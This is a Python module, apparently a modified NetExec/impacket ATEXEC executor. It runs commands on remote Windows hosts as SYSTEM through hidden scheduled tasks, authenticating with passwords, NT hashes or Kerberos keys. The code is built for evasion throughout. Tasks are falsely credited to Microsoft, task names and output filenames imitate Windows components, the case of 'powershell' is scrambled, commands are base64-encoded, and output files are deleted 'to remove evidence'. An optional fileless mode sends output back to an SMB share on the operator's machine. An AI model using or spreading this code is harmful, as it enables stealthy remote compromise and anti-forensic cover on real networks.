import os
import base64
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import gen_random_string
from time import sleep
from datetime import datetime, timedelta
import contextlib
import random
import uuid
import re


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % self.__target
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def get_remote_time(self):
        """Fetch the remote system's current time using a PowerShell command"""
        try:
            # Create a temporary task to get the remote system's time
            cmd = "Get-Date -Format 'yyyy-MM-ddTHH:mm:ss'"
            b64_cmd = base64.b64encode(cmd.encode('utf-16le')).decode()
            
            # Generate a unique task name
            time_query_task = f"SystemTimeQuery-{uuid.uuid4().hex[:8].upper()}"
            
            # Create XML with a time query - ensure XML is properly formatted
            time_query_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-01-01T00:00:00</Date>
    <Author>Microsoft Corporation</Author>
    <Description>System time utility task</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command>
      <Arguments>-EncodedCommand {b64_cmd}</Arguments>
    </Exec>
  </Actions>
</Task>"""
            
            self.logger.debug("Querying target system time...")
            
            # Connect to remote system
            dce = self.__rpctransport.get_dce_rpc()
            if self.__doKerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.set_credentials(*self.__rpctransport.get_credentials())
            dce.connect()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            
            # Create the time query task
            time_output_file = f"C:\\Windows\\Temp\\systime-{gen_random_string(8)}.txt"
            time_query_xml = time_query_xml.replace(cmd, f"{cmd} | Out-File -FilePath '{time_output_file}' -Encoding ASCII")
            
            b64_cmd = base64.b64encode(f"{cmd} | Out-File -FilePath '{time_output_file}' -Encoding ASCII".encode('utf-16le')).decode()
            time_query_xml = time_query_xml.replace("{b64_cmd}", b64_cmd)
            
            # Register and run task
            tsch.hSchRpcRegisterTask(dce, f"\\{time_query_task}", time_query_xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            tsch.hSchRpcRun(dce, f"\\{time_query_task}", NULL)
            
            # Wait for task to complete
            sleep(3)
            
            # Read the time from the output file
            smb_path = time_output_file.replace("C:", "").replace("\\", "/").lstrip("/")
            smbConnection = self.__rpctransport.get_smb_connection()
            
            # Try to read the time file
            remote_time = None
            try:
                smbConnection.getFile(self.__share, smb_path, self.output_callback)
                remote_time_str = self.__outputBuffer.decode('ascii', errors='ignore').strip()
                
                # Reset the output buffer
                self.__outputBuffer = b""
                
                # Clean up the time file
                try:
                    smbConnection.deleteFile(self.__share, smb_path)
                except:
                    pass
                
                # Verify we got a valid datetime
                if re.match(r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}', remote_time_str):
                    remote_time = remote_time_str
                    self.logger.debug(f"Target system time: {remote_time}")
                else:
                    self.logger.debug(f"Retrieved invalid time format: {remote_time_str}")
            except Exception as e:
                self.logger.debug(f"Failed to read remote time file: {e}")
            
            # Delete task
            try:
                tsch.hSchRpcDelete(dce, f"\\{time_query_task}")
            except:
                pass
            
            # Disconnect
            with contextlib.suppress(Exception):
                dce.disconnect()
                
            return remote_time
            
        except Exception as e:
            self.logger.debug(f"Error getting remote time: {e}")
            return None

    def get_time_boundaries(self):
        """Get time boundaries based on the target system time if possible, or local time as fallback"""
        remote_time = self.get_remote_time()
        
        if remote_time:
            # Use remote time
            current_time = remote_time
            # Parse the remote time string to a datetime
            remote_dt = datetime.strptime(remote_time, "%Y-%m-%dT%H:%M:%S")
            # Calculate end boundary (current time + 5 minutes)
            end_dt = remote_dt + timedelta(minutes=5)
            end_boundary = end_dt.strftime("%Y-%m-%dT%H:%M:%S")
        else:
            # Fallback to local time
            self.logger.debug("Using local time for task boundaries (fallback)")
            current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
            end_dt = datetime.now() + timedelta(minutes=5)
            end_boundary = end_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
            
        return current_time, end_boundary

    def get_legitimate_task_filename(self):
        """Generate a more plausible task scheduler related filename"""
        task_prefixes = ["TS", "Task", "Microsoft-Task", "Windows-Task", "TaskManager", "Schedule"]
        extensions = ["wdb"]
        
        prefix = random.choice(task_prefixes)
        extension = random.choice(extensions)
        
        # Generate different filename formats
        formats = [
            f"{prefix}_{uuid.uuid4().hex[:8].upper()}.{extension}",
            f"{prefix}-{datetime.now().strftime('%Y%m%d')}.{extension}",
            f"Microsoft-{prefix}-{gen_random_string(6).upper()}.{extension}"
        ]
        
        return random.choice(formats)
        
    def get_legitimate_task_name(self):
        """Generate a more plausible scheduled task name"""
        vendors = ["Microsoft", "Windows", "System"]
        components = ["Maintenance", "Update", "Diagnostics", "Performance", "Security", "Network"]
        actions = ["Task", "Manager", "Monitor", "Service", "Scheduler"]
        
        formats = [
            f"{random.choice(vendors)}-{random.choice(components)}-{random.choice(actions)}",
            f"{random.choice(vendors)}{random.choice(components)}",
            f"{random.choice(components)}{random.choice(actions)}"
        ]
        
        task_name = random.choice(formats)
        
        # Sometimes add a random component ID
        if random.choice([True, False]):
            task_name = f"{task_name}-{uuid.uuid4().hex[:8].upper()}"
            
        return task_name

    def gen_xml(self, command, fileless=False):
        
        safer_command = command
        
        if "powershell" in command.lower() and ("-command" in command.lower() or "-c " in command.lower()):
            self.logger.debug("PowerShell command detected, keeping as is (user requested)")
            
            # case randomization
            safer_command = command.replace("powershell", "poWerSheLL").replace("POWERSHELL", "PoWeRsHeLL")
            
        valid_system_filename_prefixes = [
            "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-", 
            "Defender-", "SIH-", "WER-", "Cluster-", "ws_trace-"
        ]
        
        # Create a filename that looks like a legitimate Windows log or temp file
        system_prefix = random.choice(valid_system_filename_prefixes)
        random_date = datetime.now().strftime("%Y%m%d")
        random_suffix = gen_random_string(4)
        
        legit_filename = f"{system_prefix}{random_date}-{random_suffix}.log"
        
        # Use a more convincing task-related filename for output with .wdb extension
        task_filename = self.get_legitimate_task_filename()
        
        # Store in ProgramData as originally requested but with convincing filename
        self.__output_filename = f"C:\\ProgramData\\{task_filename}"

        if self.__retOutput:
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__share_name}\\{legit_filename}', (& {{ {safer_command} }}))"
            else:
                ps_cmd = f"[IO.File]::WriteAllText('{self.__output_filename}', (& {{ {safer_command} }}))"
        else:
            ps_cmd = safer_command

        # Generate Base64 encoded PowerShell command
        b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode()

        # Using basic time format that will always be valid - not dependent on accurate time
        dummy_time = "2025-01-01T00:00:00"
        current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")

        # Create XML with no time-dependent triggers
        # Use OnRegistration without time boundaries, which will trigger immediately regardless of system time
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{current_time}</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Scheduled system maintenance and diagnostics task</Description>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command>
      <Arguments>-EncodedCommand {b64}</Arguments>
    </Exec>
  </Actions>
</Task>"""
        return xml

    def windows_path_to_smb(self, windows_path):
        """Convert a Windows path to SMB path format correctly handling nested directories."""
        # Remove drive letter and normalize slashes
        path = windows_path.replace("C:", "").replace("\\", "/").lstrip("/")
        return path

    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        
        try:
            dce.connect()
        except Exception as e:
            self.logger.fail(f"Failed to connect to DCE/RPC service: {e!s}")
            return

        # Use the legitimate task name generator
        tmpName = self.get_legitimate_task_name()
        
        # Log the name but don't show it's specially crafted
        self.logger.debug(f"Using task name: {tmpName}")

        xml = self.gen_xml(command, fileless)

        self.logger.debug(f"Task XML: {xml}")
        self.logger.info(f"Creating task: {tmpName}")
        
        try:
            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            
            # Clean disconnect
            with contextlib.suppress(Exception):
                dce.disconnect()
            return

        # After task creation, try to run it immediately - but with better handling
        run_immediately = True
        try:
            tsch.hSchRpcRun(dce, f"\\{tmpName}", NULL)
            self.logger.debug("Task run request sent successfully")
        except Exception as e:
            self.logger.debug(f"Executing task using trigger..")
            run_immediately = False
            
        # Increase initial wait time if we weren't able to run the task immediately
        if not run_immediately:
            sleep(5)  # Wait longer before checking for completion
        else:
            sleep(2)  # Shorter wait if we could run it directly

        # Wait for task execution
        wait_attempts = 0
        done = False
        task_ran = False
        max_attempts = 20  # Increased max attempts
                
        while not done and wait_attempts < max_attempts:
            try:
                self.logger.debug(f"Checking if task {tmpName} has run (attempt {wait_attempts + 1}/{max_attempts})")
                resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
                if resp["pLastRuntime"]["wYear"] != 0:
                    self.logger.debug(f"Task: {tmpName} executed")
                    done = True
                    task_ran = True
                else:
                    self.logger.debug(f"Task: {tmpName} has not run yet, waiting...")
                    wait_attempts += 1
                    sleep(2)
            except Exception as e:
                if "SCHED_S_TASK_HAS_NOT_RUN" in str(e):
                    self.logger.debug("Task has not run yet (expected status), continuing to wait")
                else:
                    self.logger.debug(f"Error checking task: {e!s}")
                
                wait_attempts += 1
                sleep(2)
                
                if wait_attempts >= 5 and self.__retOutput:  # Check for file earlier
                    try:
                        self.logger.debug("Attempting early output file check")
                        # Properly convert Windows path to SMB path format
                        smb_path = self.windows_path_to_smb(self.__output_filename)
                        self.logger.debug(f"Checking for output file at SMB path: {smb_path}")
                        smbConnection = self.__rpctransport.get_smb_connection()
                        smbConnection.getFile(self.__share, smb_path, self.output_callback)
                        self.logger.debug("Found output file, task must have completed")
                        done = True
                        task_ran = True
                        break
                    except Exception as e:
                        self.logger.debug(f"Early output check failed: {e}")

        try:
            self.logger.info(f"Deleting task: {tmpName}")
            tsch.hSchRpcDelete(dce, f"\\{tmpName}")
        except Exception as e:
            self.logger.debug(f"Error deleting task: {e!s}")

        if not task_ran and self.__retOutput:
            self.logger.debug("Waiting additional time for command execution to complete")
            sleep(5)  # Increased wait time

        if self.__retOutput:
            if fileless:
                # For fileless execution, read from the network share
                max_attempts = 15
                attempts = 0
                while attempts < max_attempts:
                    try:
                        file_path = os.path.join("/tmp", "nxc_hosted", os.path.basename(self.__output_filename))
                        self.logger.debug(f"Looking for fileless output at: {file_path}")
                        with open(file_path) as output:
                            self.output_callback(output.read())
                        
                        # cleanup
                        try:
                            os.remove(file_path)
                            self.logger.debug(f"Removed fileless output file: {file_path}")
                        except OSError as e:
                            self.logger.debug(f"Could not remove file {file_path}: {e}")
                        break
                    except OSError:
                        sleep(2)
                        attempts += 1
            else:
                smbConnection = self.__rpctransport.get_smb_connection()

                tries = 1
                sleep(1)
                
                # Properly convert Windows path to SMB path
                smb_path = self.windows_path_to_smb(self.__output_filename)
                output_basename = os.path.basename(self.__output_filename)
                
                
                while True:
                    try:
                        self.logger.info(f"Attempting to read output from: {self.__output_filename}")
                        smbConnection.getFile(self.__share, smb_path, self.output_callback)
                        break
                    except Exception as e:
                        if tries >= self.__tries:
                            self.logger.fail("ATEXEC: Could not retrieve output file. It may have been detected by AV, or the task did not execute successfully.")
                            break
                        if "STATUS_BAD_NETWORK_NAME" in str(e):
                            self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                            break
                        elif "STATUS_VIRUS_INFECTED" in str(e):
                            self.logger.fail("Command did not run because a virus was detected")
                            break
                        elif "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                            self.logger.info(f"Path not found for {self.__output_filename}, trying alternate path...")
                            # Try with just the filename in case path issues
                            try:
                                alternate_path = output_basename
                                self.logger.debug(f"Attempting with alternate path: {alternate_path}")
                                smbConnection.getFile(self.__share, alternate_path, self.output_callback)
                                self.logger.debug("Successfully retrieved file with alternate path")
                                break
                            except Exception as alt_e:
                                self.logger.debug(f"Alternate path also failed: {alt_e}")
                                tries += 1
                                sleep(1)
                        # When executing powershell and the command is still running, we get a sharing violation
                        elif "STATUS_SHARING_VIOLATION" in str(e):
                            self.logger.info(f"File {output_basename} is still in use, retrying...")
                            tries += 1
                            sleep(1)
                        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                            self.logger.info(f"File {output_basename} not found, retrying...")
                            tries += 2
                            sleep(1)
                        else:
                            self.logger.debug(f"Error reading output file: {e!s}. Retrying...")
                            tries += 1
                            sleep(1)

                # Delete the file to remove evidence, but only if we successfully read it
                if tries < self.__tries:
                    try:
                        self.logger.debug(f"Deleting output file: {output_basename}")
                        smbConnection.deleteFile(self.__share, smb_path)
                    except Exception as e:
                        self.logger.debug(f"Could not delete output file: {e!s}")
                        # Try with just the filename as a fallback
                        try:
                            smbConnection.deleteFile(self.__share, output_basename)
                        except Exception:
                            pass

        # Always ensure proper disconnect
        with contextlib.suppress(Exception):
            dce.disconnect()